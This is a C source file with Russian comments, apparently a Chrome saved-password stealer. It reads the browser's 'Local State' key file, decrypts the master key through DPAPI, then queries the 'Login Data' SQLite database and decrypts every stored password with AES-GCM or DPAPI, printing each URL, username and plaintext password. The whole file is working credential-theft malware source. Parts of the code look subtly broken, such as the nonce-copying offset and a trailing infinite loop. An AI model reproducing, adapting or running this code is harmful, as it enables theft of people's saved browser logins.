#include <Windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <dpapi.h>
#include <Shlobj.h>
#include <Bcrypt.h>
#include <stdint.h>
#pragma comment(lib, "bcrypt.lib")

#include "Base64.h"
#include "sqlite/sqlite3.h"

#define DPAPI_PREFIX_LEN 5
#define V10_LEN 3
#define NONCE_LEN 12
#define MAX_SIZE_PASS 1*1024

static BCRYPT_ALG_HANDLE hAlg;
static BCRYPT_KEY_HANDLE hKey;

/*
    Получаем путь до файла Local State
*/

static BOOL GetKeyPath(char* keyPath)
{
    //получаем путь до AppData
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, keyPath) == S_OK)
    {
        //файл Local State содержит зашифрованный ключ для AES256-GCM (base64+DPAPI)
        lstrcatA(keyPath, "\\Google\\Chrome\\User Data\\Local State");

        return TRUE;
    }

    return FALSE;
}

/*
    Функция возвращает TRUE, в случае успеха.
    В key помещается ключ (base64), keySize - размер ключа.
*/

static BOOL GetChromeKey(char* key, DWORD* keySize)
{
    char* chromePath = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD fileSize = 0;
    char* tempBuff = NULL;
    char* chromeKey = NULL;

    chromePath = (char*)malloc(MAX_PATH);
    memset(chromePath, 0, MAX_PATH);

    if (!GetKeyPath(chromePath))
    {
        return FALSE;
    }

    hFile = CreateFileA(chromePath, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    fileSize = GetFileSize(hFile, NULL);

    if (fileSize == 0)
    {
        return FALSE;
    }

    tempBuff = (char*)malloc(fileSize);
    if (tempBuff != NULL)
    {
        memset(tempBuff, 0, fileSize);
    }

    DWORD numToRead;
    if (!ReadFile(hFile, tempBuff, fileSize, &numToRead, NULL))
    {
        return FALSE;
    }

    CloseHandle(hFile);

    chromeKey = (char*)malloc(fileSize);
    if (chromeKey != NULL)
    {
        memset(chromeKey, 0, fileSize);
    }

    for (int i = 0; i < fileSize; i++)
    {
        //если дошли до encrypted_key":" - начинаем писать ключ
        if (tempBuff[i] == 'k' && tempBuff[i + 1] == 'e' && tempBuff[i + 2] == 'y' && tempBuff[i + 3] == '\"' && tempBuff[i + 4] == ':' && tempBuff[i + 5] == '\"')
        {
            int counter = 0;
            //6 - длина "key":""
            for (int i1 = i + 6; ; i1++)
            {
                if (tempBuff[i1] == '\"')
                {
                    free(tempBuff);
                    lstrcatA(key, chromeKey);
                    *keySize = lstrlenA(key);
                    free(chromeKey);

                    return TRUE;
                }
                chromeKey[counter++] = tempBuff[i1];
            }
        }
    }

    return FALSE;
}

/*
    Функция возвращает TRUE, если encText расшифровать удалось
    Параметры:
    - encText - зашифрованный ключ
    - encTextSize - размер зашифрованного ключа
    - decText - сюда поместим расшифрованный массив байт
    - decTextSize - сюда поместим размер расшифрованных байт
*/

static BOOL DPAPIDecrypt(BYTE* encText, DWORD encTextSize, char* decText)
{
    DATA_BLOB in;
    DATA_BLOB out;

    in.pbData = encText;
    in.cbData = encTextSize;

    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
    {
        for (int i = 0; i < out.cbData; i++)
            decText[i] = out.pbData[i];
        decText[out.cbData] = '\0';

        return TRUE;
    }

    return FALSE;
}

/*
    Функция окончательно расшифровывает пароль.
    Параметры:
    - keyBase64 - указатель на строку, полученную функцией GetChromeKey()
    - keySize - размер строки
    - decKey - сюда помещается расшифрованный ключ
    - decKeySize - сюда помещается размер расшифрованного ключа
    В случае успеха функция возвращает TRUE, иначе - FALSE.
*/

static BOOL KeyDecrypt(char* keyBase64, DWORD keySize, char* decKey)
{
    char* keyEncDPAPI = NULL;
    DWORD keyEncDPAPISize = 0;
    BYTE* keyEnc = NULL;
    DWORD keyEncSize = 0;

    keyEncDPAPI = (char*)malloc(keySize);
    memset(keyEncDPAPI, 0, keySize);

    //расшифровываем base64
    keyEncDPAPISize = base64_decode(keyBase64, keySize, keyEncDPAPI);

    keyEnc = (BYTE*)malloc((keyEncDPAPISize - DPAPI_PREFIX_LEN));
    memset(keyEnc, 0, (keyEncDPAPISize - DPAPI_PREFIX_LEN));

    //убираем префикс "DPAPI"
    int counter = 0;
    for (int i = DPAPI_PREFIX_LEN; i < keyEncDPAPISize; i++)
    {
        keyEnc[counter++] = keyEncDPAPI[i];
    }

    if (DPAPIDecrypt(keyEnc, (keyEncDPAPISize - DPAPI_PREFIX_LEN), decKey))
    {
        free(keyEncDPAPI);
        free(keyEnc);
        return TRUE;
    }

    return FALSE;
}

static void GetNonce(char* decKey, DWORD decKeySize, BYTE* nonce)
{
    //nonce - первые 12 байт (префикс "v10" не учитывается)
    for (int i = V10_LEN; i < (NONCE_LEN + V10_LEN); i++)
    {
        nonce[i] = decKey[i];
    }
}

static BOOL GetCromeDbPath(char* chromeDbPath)
{
    //получаем путь до AppData
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromeDbPath) == S_OK)
    {
        lstrcatA(chromeDbPath, "\\Google\\Chrome\\User Data\\Default\\Login Data");
        return TRUE;
    }

    return FALSE;
}

static bool Init_for_chrome_80(void)
{
    bool bRet = false;
    do
    {
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
        {
            printf("[DEBUG] Crypt::BCrypt::Init: can't initialize cryptoprovider. Last error code: %d \n", GetLastError());
            break;
        }

        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
        {
            printf("[DEBUG] Crypt::BCrypt::Init: can't set chaining mode. Last error code: %d \n", GetLastError());
            break;
        }
        bRet = true;
    } while (false);

    return bRet;
}

static bool Init_key_for_chrome_80(IN PBYTE pbKey, IN ULONG sizeKey)
{
    bool bRet = true;

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, sizeKey, 0) != 0)
    {
        printf("[DEBUG] Crypt::BCrypt::Init: can't deinitialize cryptoprovider. Last error code: %d \n", GetLastError());
        bRet = false;
    }

    return bRet;
}

int main()
{
    char* chromeDbPath = NULL;
    chromeDbPath = (char*)calloc(MAX_PATH, sizeof(char));

    if (!GetCromeDbPath(chromeDbPath))
    {
        printf("GetCromeDbPath error!\n");
        return -1;
    }

    sqlite3* db;
    if (sqlite3_open(chromeDbPath, &db) != SQLITE_OK)
    {
        printf("sqlite3_open error!\n");
        return -1;
    }

    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
    {
        printf("sqlite3_prepare_v2 error! %d\n", GetLastError());
        return -1;
    }

    int entries = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW)
    {
        char* url = (char*)sqlite3_column_text(stmt, 0);
        char* username = (char*)sqlite3_column_text(stmt, 1);
        char* password = (char*)sqlite3_column_text(stmt, 2);

        printf("Url: %s\n", url);
        printf("Username: %s\n", username);

        int passSize = sqlite3_column_bytes(stmt, 2);
        char decryptedPass[1024];
        DWORD decPassSize = 0;

        if ((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0')
        {
            static char keyBase64[1024];
            DWORD keySize = 0;
            char decryptedKey[32]; //ключ размером 32 байта (256 бит)

            BYTE nonce[12];

            if (!GetChromeKey(keyBase64, &keySize))
            {
                return -1;
            }

            if (!KeyDecrypt(keyBase64, keySize, decryptedKey))
            {
                return -1;
            }

            DWORD decKeySize = strlen(decryptedKey);
            GetNonce(decryptedKey, decKeySize, nonce);

            Init_for_chrome_80();
            Init_key_for_chrome_80((PBYTE)decryptedKey, decKeySize);

            char* pbOutput = NULL;
            pbOutput = (char*)malloc(MAX_SIZE_PASS);
            if (pbOutput == NULL) {
                printf("No free memory");
                return (-1);
            }

            ULONG cbOutput = MAX_SIZE_PASS;
            ULONG cbCiphertext = 0;

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
            BCRYPT_INIT_AUTH_MODE_INFO(BACMI); // Макрос инициализирует структуру BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO

            BACMI.pbNonce = (PUCHAR)(password + 3); // Пропускаем префикс "v10".
            BACMI.cbNonce = 12; // Размер Nonce = 12 байт.

            BACMI.pbTag = (PUCHAR)(password + passSize - 16);
            BACMI.cbTag = 16;

            NTSTATUS status = 0;
            if (!BCRYPT_SUCCESS(status = BCryptDecrypt(hKey, (BYTE*)(password + 15), passSize - 15 - 16, &BACMI, NULL, 0, (PUCHAR)pbOutput, cbOutput, &cbCiphertext, 0)))
            {
                printf("Error: 0x%x\n", status);
            }

            pbOutput[cbCiphertext] = '\0';

            printf("Password:%s \n", pbOutput);
        }
        else
        {
            if (DPAPIDecrypt((BYTE*)password, passSize, decryptedPass))
            {
                printf("Password: %s\n", decryptedPass);
            }
            else
            {
                printf("Decryptintg error!\n");
            }
        }

        entries++;
    }
    while (1);
    return 0;
}
